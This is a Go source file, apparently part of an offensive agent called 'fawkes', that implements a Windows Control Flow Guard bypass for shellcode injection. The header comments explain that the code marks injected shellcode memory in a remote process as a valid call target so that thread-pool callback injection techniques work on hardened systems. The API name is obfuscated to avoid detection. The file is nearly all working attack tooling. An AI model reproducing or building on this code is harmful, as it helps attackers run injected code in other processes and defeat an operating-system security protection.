//go:build windows
// +build windows

// cfg_bypass_windows.go provides Control Flow Guard (CFG) bypass support for
// callback-based process injection techniques.
//
// Windows CFG maintains a per-process bitmap of valid indirect call targets. When
// shellcode is injected into a newly-allocated RX memory region, that address is
// absent from the CFG bitmap. Any indirect call through a thread-pool callback
// struct (TP_WORK, TP_WAIT, TP_IO, etc.) or a kernel callback table entry triggers
// a CFG check, which blocks execution on hardened Windows 10/11 targets.
//
// SetProcessValidCallTargets explicitly marks the shellcode allocation as a valid
// CFG target in the remote process, allowing the callback to proceed. This is
// required for PoolParty variants 2-8 and Opus variants 1/4 on systems with CFG.

package commands

import (
	"fmt"
	"sync"
	"syscall"
	"unsafe"

	"fawkes/pkg/obfuscate"
)

const (
	// cfgCallTargetValid marks an address as a valid indirect call target in the CFG bitmap.
	cfgCallTargetValid uintptr = 0x1
)

// cfgCallTargetInfo is the CFG_CALL_TARGET_INFO structure passed to SetProcessValidCallTargets.
// Offset is relative to the base VirtualAddress; Flags controls validity.
type cfgCallTargetInfo struct {
	Offset uintptr
	Flags  uintptr
}

var (
	procSetProcessValidCallTargets *syscall.LazyProc
	initCFGBypassOnce              sync.Once
)

func ensureCFGBypassAPIs() {
	initCFGBypassOnce.Do(func() {
		name := obfuscate.SetProcessValidCallTargets()
		defer obfuscate.Zero(name)
		procSetProcessValidCallTargets = kernel32.NewProc(name)
	})
}

// cfgBypassApplyToTarget marks the shellcode allocation as a valid CFG call target
// in the remote process hProcess. addr is the base of the allocation; size is its
// length in bytes (Windows rounds up to CFG granularity internally).
//
// Returns nil on success. Returns a wrapped error if SetProcessValidCallTargets fails,
// which may indicate CFG is not enabled on this target (non-CFG process) or the
// process handle lacks sufficient access.
func cfgBypassApplyToTarget(hProcess uintptr, addr uintptr, size int) error {
	ensureCFGBypassAPIs()
	target := cfgCallTargetInfo{
		Offset: 0, // shellcode starts at base of allocation
		Flags:  cfgCallTargetValid,
	}
	ret, _, err := procSetProcessValidCallTargets.Call(
		hProcess,
		addr,
		uintptr(size),
		1, // NumberOfOffsets
		uintptr(unsafe.Pointer(&target)),
	)
	if ret == 0 {
		return fmt.Errorf("SetProcessValidCallTargets failed: %w", err)
	}
	return nil
}
